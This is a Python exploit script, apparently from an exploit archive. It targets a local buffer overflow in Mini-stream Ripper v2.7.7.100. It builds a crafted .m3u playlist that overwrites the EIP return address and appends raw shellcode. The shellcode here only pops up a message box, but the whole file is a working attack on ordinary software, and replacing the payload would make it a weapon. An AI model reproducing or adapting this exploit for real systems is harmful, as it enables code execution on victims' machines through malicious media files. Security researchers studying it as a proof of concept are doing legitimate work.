#!/usr/bin/env python
#[+] Author: TUNISIAN CYBER
#[+] Exploit Title: Mini-sream Ripper v2.7.7.100 Local Buffer Overflow
#[+] Date: 25-03-2015
#[+] Type: Local Exploits
#[+] Tested on: WinXp/Windows 7 Pro
#[+] Vendor: http://software-files-a.cnet.com/s/software/10/65/60/43/Mini-streamRipper.exe?token=1427334864_8d9c5d7d948871f54ae14ed9304d1ddf&fileName=Mini-streamRipper.exe
#[+] Friendly Sites: sec4ever.com
#[+] Twitter: @TCYB3R
#[+] Original POC:
#    http://www.exploit-db.com/exploits/11197/
#POC:
#IMG1:
#http://i.imgur.com/ifXYgwx.png
#IMG2:
#http://i.imgur.com/ZMisj6R.png
from struct import pack
file="crack.m3u"
junk="\x41"*35032
eip=pack('<I',0x7C9D30D7)
junk2="\x44"*4
#Messagebox Shellcode (113 bytes) - Any Windows Version By Giuseppe D'Amore
#http://www.exploit-db.com/exploits/28996/
shellcode= ("\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
           "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
           "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
         "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
           "\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
           "\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
          "\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
           "\x49\x0b\x31\xc0\x51\x50\xff\xd7")
writeFile = open (file, "w")
writeFile.write(junk+eip+junk2+shellcode)
writeFile.close()